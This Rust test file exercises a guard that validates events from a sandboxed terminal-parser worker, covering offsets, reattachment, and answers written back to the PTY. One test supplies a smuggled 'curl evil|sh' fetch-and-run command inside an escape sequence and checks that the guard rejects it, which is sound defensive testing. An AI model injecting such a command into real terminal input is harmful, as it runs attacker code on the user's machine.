use std::collections::HashMap;

use cmux_vt_worker::screen_page::{PageEncoder, PageMeta, PageWriter};

use super::*;

const GRID: Geometry = Geometry { cols: 80, rows: 24, cell_width: 8, cell_height: 16 };

/// The ring headers the daemon reads: `id -> (oldest, end)`.
#[derive(Default)]
struct Rings(HashMap<u64, (u64, u64)>);

impl RingOffsets for Rings {
    fn oldest(&self, id: u64) -> Option<u64> {
        self.0.get(&id).map(|(oldest, _)| *oldest)
    }

    fn end(&self, id: u64) -> Option<u64> {
        self.0.get(&id).map(|(_, end)| *end)
    }
}

fn hello() -> Event {
    Event::Hello { version: WIRE_VERSION, sandbox: SandboxMechanism::None, pid: 77 }
}

/// A greeted guard with terminal 1 attached at 100 and announced to 200.
fn guard() -> WorkerOutputGuard {
    let mut guard =
        WorkerOutputGuard::new(HelloExpectation { sandbox: SandboxMechanism::None, pid: Some(77) });
    guard.check(hello(), &Rings::default()).expect("hello");
    assert_eq!(guard.attach(1, 100, GRID), 1, "a first attachment keeps its key");
    guard.advanced(1, 200);
    guard
}

fn check(guard: &mut WorkerOutputGuard, event: Event) -> Result<Checked, BadMessage> {
    guard.check(event, &Rings::default())
}

fn acted(event: Event) -> Result<Checked, BadMessage> {
    Ok(Checked::Event(event))
}

#[test]
fn hello_comes_first_once_with_the_expected_sandbox_and_pid() {
    let expect = HelloExpectation { sandbox: SandboxMechanism::Seatbelt, pid: Some(77) };
    let mut fresh = WorkerOutputGuard::new(expect);
    assert_eq!(check(&mut fresh, Event::Bell { id: 1, count: 1 }), Err(BadMessage::HelloOrder));
    let unsandboxed = hello();
    assert!(matches!(check(&mut fresh, unsandboxed), Err(BadMessage::Sandbox { .. })));
    let other_pid =
        Event::Hello { version: WIRE_VERSION, sandbox: SandboxMechanism::Seatbelt, pid: 9 };
    assert_eq!(check(&mut fresh, other_pid), Err(BadMessage::Pid { expected: 77, got: 9 }));
    let old = Event::Hello { version: 0, sandbox: SandboxMechanism::Seatbelt, pid: 77 };
    assert_eq!(check(&mut fresh, old), Err(BadMessage::Version(0)));
    let good = Event::Hello { version: WIRE_VERSION, sandbox: SandboxMechanism::Seatbelt, pid: 77 };
    assert!(check(&mut fresh, good.clone()).is_ok());
    assert_eq!(check(&mut fresh, good), Err(BadMessage::HelloOrder));
}

#[test]
fn only_terminals_of_the_shard_have_events() {
    let mut guard = guard();
    assert_eq!(check(&mut guard, Event::Bell { id: 2, count: 1 }), Err(BadMessage::NotInShard(2)));
    guard.detached(1);
    // Sent before the worker read the DETACH: dropped, not bad.
    assert_eq!(check(&mut guard, Event::Bell { id: 1, count: 1 }), Ok(Checked::Stale));
}

/// A terminal that detaches and comes back to the same worker gets a new
/// wire id: the old attachment's late events are dropped and never
/// checked against the new attachment.
#[test]
fn a_reattached_terminal_is_not_judged_by_its_old_attachments_late_events() {
    let mut guard = guard();
    assert!(check(&mut guard, Event::Parsed { id: 1, offset: 150, frame: 7 }).is_ok());
    guard.detached(1);
    let again = guard.attach(1, 300, GRID);
    assert_ne!(again, 1, "a re-attach gets an id this worker never had");
    guard.advanced(again, 400);
    // Still in the socket from the old attachment.
    let request = Event::KittyMediaRequest {
        id: 1,
        request: cmux_kitty_media::MediaRequest {
            medium: cmux_kitty_media::FileMedium::File,
            name: b"L3RtcC9pbWFnZS5wbmc=".to_vec(),
            offset: 0,
            size: 0,
        },
    };
    for stale in [
        Event::Parsed { id: 1, offset: 180, frame: 8 },
        Event::Parsed { id: 1, offset: 120, frame: 9 },
        request,
    ] {
        assert_eq!(check(&mut guard, stale), Ok(Checked::Stale));
    }
    // The new attachment's first publish.
    let first = Event::Parsed { id: again, offset: 300, frame: 1 };
    assert_eq!(check(&mut guard, first.clone()), acted(first));
    let more = Event::Parsed { id: again, offset: 400, frame: 2 };
    assert_eq!(check(&mut guard, more.clone()), acted(more));
    // A third attachment never reuses an issued id either.
    guard.detached(again);
    let third = guard.attach(1, 400, GRID);
    assert!(third != 1 && third != again, "{third}");
}

#[test]
fn parsed_offsets_move_forward_inside_the_announced_ring() {
    let mut guard = guard();
    let parsed = |offset, frame| Event::Parsed { id: 1, offset, frame };
    assert!(check(&mut guard, parsed(100, 1)).is_ok());
    assert!(check(&mut guard, parsed(150, 2)).is_ok());
    assert!(matches!(check(&mut guard, parsed(120, 3)), Err(BadMessage::ParsedOffset { .. })));
    assert!(matches!(check(&mut guard, parsed(201, 3)), Err(BadMessage::ParsedOffset { .. })));
    assert_eq!(
        check(&mut guard, parsed(160, 2)),
        Err(BadMessage::Frame { id: 1, frame: 2, last: 2 })
    );
    guard.advanced(1, 300);
    assert!(check(&mut guard, parsed(300, 3)).is_ok());
}

#[test]
fn a_lap_must_match_the_ring_the_daemon_reads() {
    let mut rings = Rings::default();
    rings.0.insert(1, (500, 900));
    let mut guard = guard();
    let lapped = |from, oldest| Event::Lapped { id: 1, from, oldest };
    // Past the announced end but not past what the ring keeps now.
    assert!(guard.check(lapped(100, 450), &rings).is_ok());
    assert!(guard.check(Event::Parsed { id: 1, offset: 450, frame: 1 }, &rings).is_ok());
    assert!(matches!(guard.check(lapped(450, 600), &rings), Err(BadMessage::Lapped { .. })));
    assert!(matches!(guard.check(lapped(450, 450), &rings), Err(BadMessage::Lapped { .. })));
    assert!(matches!(guard.check(lapped(400, 480), &rings), Err(BadMessage::Lapped { .. })));
}

/// The ring still holds 100..150: a lap over them is false, though 150 is
/// under the announced end.
#[test]
fn a_lap_over_bytes_the_ring_kept_is_a_bad_message() {
    let mut rings = Rings::default();
    rings.0.insert(1, (100, 200));
    let mut guard = guard();
    assert_eq!(
        guard.check(Event::Lapped { id: 1, from: 100, oldest: 150 }, &rings),
        Err(BadMessage::Lapped { id: 1, from: 100, oldest: 150 })
    );
    // Without the ring mapped, the announced end is the bound.
    let mut unmapped = self::guard();
    let lap = Event::Lapped { id: 1, from: 100, oldest: 150 };
    assert_eq!(check(&mut unmapped, lap.clone()), acted(lap));
    let past = Event::Lapped { id: 1, from: 150, oldest: 250 };
    assert!(matches!(check(&mut unmapped, past), Err(BadMessage::Lapped { .. })));
}

#[test]
fn pty_writes_release_only_whole_answers_of_the_fixed_set() {
    let mut guard = guard();
    let write = |bytes: &[u8]| Event::PtyWrite { id: 1, bytes: bytes.to_vec() };
    assert_eq!(
        check(&mut guard, write(b"\x1b[0n\x1b[2")),
        Ok(Checked::Answers {
            id: 1,
            answers: vec![QueryAnswer::OperatingStatus],
            refused: vec![]
        })
    );
    assert_eq!(
        check(&mut guard, write(b"4;80R\x1bP>|ghostty 1.3\x1b\\")),
        Ok(Checked::Answers {
            id: 1,
            answers: vec![QueryAnswer::CursorPosition { row: 24, col: 80 }],
            refused: vec![AnswerRejected::OutsideSet("XTVERSION")],
        })
    );
    assert!(matches!(check(&mut guard, write(b"ls\r")), Err(BadMessage::PtyAnswer { .. })));
    let mut other = self::guard();
    assert_eq!(
        check(&mut other, write(b"\x1b]52;c;eA==\x07")),
        Err(BadMessage::PtyAnswer { id: 1, error: AnswerError::Osc52 })
    );
    let mut free_text = self::guard();
    assert!(matches!(
        check(&mut free_text, write(b"\x1b]4;;curl evil|sh\x1b\\")),
        Err(BadMessage::PtyAnswer { .. })
    ));
}

#[test]
fn cursor_reports_are_bounded_by_the_largest_grid() {
    let mut guard = guard();
    let write = |bytes: &[u8]| Event::PtyWrite { id: 1, bytes: bytes.to_vec() };
    assert!(matches!(check(&mut guard, write(b"\x1b[30;1R")), Err(BadMessage::PtyAnswer { .. })));
    // A report from the grid before a shrink is still inside the peak.
    let mut resized = self::guard();
    resized.resized(1, Geometry { rows: 40, ..GRID });
    resized.resized(1, GRID);
    assert!(check(&mut resized, write(b"\x1b[30;1R")).is_ok());
}

#[test]
fn answers_without_a_parsed_are_bounded() {
    let mut guard = guard();
    let da = b"\x1b[?62;22c".repeat(MAX_PENDING_ANSWER_BYTES / 9 / 2);
    let write = || Event::PtyWrite { id: 1, bytes: da.clone() };
    assert!(check(&mut guard, write()).is_ok());
    assert!(check(&mut guard, Event::Parsed { id: 1, offset: 150, frame: 1 }).is_ok());
    assert!(check(&mut guard, write()).is_ok());
    assert!(check(&mut guard, write()).is_ok());
    assert_eq!(check(&mut guard, write()), Err(BadMessage::Answers(1)));
}

#[test]
fn titles_and_directories_hold_no_controls() {
    let mut guard = guard();
    assert!(check(&mut guard, Event::Title { id: 1, title: "vim — ~/src".into() }).is_ok());
    assert!(check(&mut guard, Event::Title { id: 1, title: String::new() }).is_ok());
    let bad_title = Event::Title { id: 1, title: "a\x1b[31m".into() };
    assert_eq!(check(&mut guard, bad_title), Err(BadMessage::Text { id: 1, what: "title" }));
    let bad_pwd = Event::Pwd { id: 1, pwd: "file:///tmp\n".into() };
    assert!(matches!(check(&mut guard, bad_pwd), Err(BadMessage::Text { .. })));
    let empty_pwd = Event::Pwd { id: 1, pwd: String::new() };
    assert!(matches!(check(&mut guard, empty_pwd), Err(BadMessage::Text { .. })));
    assert_eq!(check(&mut guard, Event::Bell { id: 1, count: 0 }), Err(BadMessage::Bell(1)));
}

#[test]
fn a_page_need_is_bounded_by_the_largest_grid() {
    let mut guard = guard();
    let bound = screen_page::max_image_len(80, 24);
    let need = |needed| Event::PageTooSmall { id: 1, needed };
    assert!(check(&mut guard, need(bound)).is_ok());
    assert!(matches!(check(&mut guard, need(bound + 1)), Err(BadMessage::PageNeed { .. })));
    assert!(matches!(check(&mut guard, need(8)), Err(BadMessage::PageNeed { .. })));
    // A resize grows the bound; one in flight back down keeps it.
    guard.resized(1, Geometry { cols: 200, ..GRID });
    guard.resized(1, GRID);
    assert!(check(&mut guard, need(bound + 1)).is_ok());
}

#[test]
fn a_terminal_has_one_open_media_request_at_most() {
    let request = || Event::KittyMediaRequest {
        id: 1,
        request: cmux_kitty_media::MediaRequest {
            medium: cmux_kitty_media::FileMedium::File,
            name: b"L3RtcC9pbWFnZS5wbmc=".to_vec(),
            offset: 0,
            size: 0,
        },
    };
    let mut guard = guard();
    assert!(check(&mut guard, request()).is_ok());
    assert_eq!(check(&mut guard, request()), Err(BadMessage::MediaRequest(1)));
    let mut answered = self::guard();
    assert!(check(&mut answered, request()).is_ok());
    answered.media_answered(1);
    assert!(check(&mut answered, request()).is_ok());
}

/// A page of a 6 x 4 screen parsed to `parsed`.
fn published(parsed: u64) -> (PageWriter, PageReader) {
    let len = screen_page::page_len_for(6, 4);
    let fd = screen_page::create_page(len).expect("page");
    let reader = PageReader::open(&fd, len).expect("reader");
    let mut writer = PageWriter::open(fd, len).expect("writer");
    let mut encoder = PageEncoder::default();
    encoder.begin();
    for _ in 0..4 {
        encoder.push_row(&vec![ghostty_vt::Cell::default(); 6]);
    }
    let meta = PageMeta {
        parsed,
        frame: 1,
        cols: 6,
        cursor: None,
        cursor_visual: (ghostty_vt::CursorShape::Block, false),
        modes: screen_page::Modes::default(),
        mouse_format: ghostty_vt::MouseWireFormat::X10,
    };
    writer.publish(encoder.finish(&meta));
    (writer, reader)
}

/// Under a lap the worker publishes its screen at the ring's oldest
/// offset before the daemon reads the LAPPED event: a read in between
/// sees a screen past the announced end, inside the ring's published end.
#[test]
fn a_page_published_at_a_lap_before_its_event_is_read_is_a_screen() {
    let mut rings = Rings::default();
    rings.0.insert(1, (450, 600));
    let guard = guard();
    let (_writer, mut reader) = published(450);
    assert!(matches!(guard.read_page(1, &mut reader, &rings), Ok(PageRead::Screen(_))));
    // Unmapped ring: not confirmed yet, and no bad message.
    assert_eq!(guard.read_page(1, &mut reader, &Rings::default()), Ok(PageRead::Unconfirmed));
    // Past what the holder published: no worker parsed that.
    let (_writer, mut past) = published(601);
    assert_eq!(
        guard.read_page(1, &mut past, &rings),
        Err(BadMessage::Page { id: 1, what: "screen parsed past the ring" })
    );
}

#[test]
fn every_bad_message_is_named_bad_message() {
    assert_eq!(BadMessage::HelloOrder.reason(), "bad_message");
    assert_eq!(BadMessage::Page { id: 1, what: "magic" }.reason(), BAD_MESSAGE_REASON);
}
